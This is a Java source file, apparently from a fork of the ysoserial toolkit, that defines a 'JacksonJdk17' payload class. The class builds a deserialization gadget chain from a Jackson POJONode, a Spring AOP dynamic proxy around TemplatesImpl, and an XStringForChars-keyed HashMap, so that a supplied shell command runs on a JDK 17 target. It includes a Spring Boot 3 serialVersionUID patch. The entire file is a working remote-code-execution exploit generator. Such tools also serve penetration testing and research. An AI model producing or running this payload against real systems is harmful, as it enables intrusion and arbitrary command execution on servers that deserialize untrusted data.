package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.CtMethod;
import org.python.bouncycastle.jcajce.provider.digest.BCMessageDigest;
import org.springframework.aop.framework.AdvisedSupport;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.10+", "org.springframework:spring-aop:4.1.4.RELEASE"})
@Authors({Authors.Unam4})
public class JacksonJdk17 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JacksonJdk17.class, args);
    }

    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {


        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public Object getObject(final String command) throws Exception {
        String cmd = "";
        if (command.contains("_")) {
            String[] s = command.split("_");
            cmd = s[0];
            if (s[1].equals("springboot3")) {
                IsSpringboot3();
            }
        }else {
            cmd = command;
        }
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        POJONode node = new POJONode(makeTemplatesImplAopProxy(cmd));
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xString = Reflections.createWithoutConstructor(aClass1);
        Reflections.setFieldValue(xString,"m_obj",new char[]{});
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ",xString);
        hashMap1.put("yy",node);
        hashMap2.put("yy",xString);
        hashMap2.put("zZ",node);
        HashMap map = Gadgets.makeMap(hashMap1, hashMap2);
        return map;
    }

    private void IsSpringboot3() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        if (ctClass.isFrozen()) {
            ctClass.defrost();
        }
        try {
            CtField field = ctClass.getDeclaredField("serialVersionUID");
            ctClass.removeField(field);
            CtField make = CtField.make("private static final long serialVersionUID = 273003553246259276;", ctClass);
            ctClass.addField(make);
        } catch (Exception e) {
            CtField make = CtField.make("private static final long serialVersionUID = 273003553246259276;", ctClass);
            ctClass.addField(make);
        }
        ctClass.toClass();
        ctClass.defrost();
    }
}
